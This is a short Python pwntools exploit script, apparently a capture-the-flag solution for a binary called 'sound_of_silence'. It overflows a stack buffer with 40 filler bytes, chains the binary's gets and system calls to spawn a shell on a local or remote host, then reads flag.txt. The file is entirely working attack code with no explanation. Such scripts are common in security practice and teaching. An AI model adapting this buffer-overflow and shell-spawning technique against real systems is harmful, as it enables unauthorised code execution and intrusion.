#!/usr/bin/env python3



from pwn import *
import sys


def exploit(io, elf):
    gets = elf.symbols["gets"]
    system = elf.symbols["system"]
    payload = b"A"*40 + p64(gets) + p64(system) 
    
    io.sendlineafter(b">> ", payload)
    io.sendline(b"/bin0sh")
    sleep(0.2)

    io.sendline(b"cat flag.txt")
    flag = io.recvline().decode()
    print(flag)

def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./sound_of_silence")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)
    elf = ELF("./sound_of_silence") 
    exploit(io, elf)


if __name__ == "__main__":
    main()
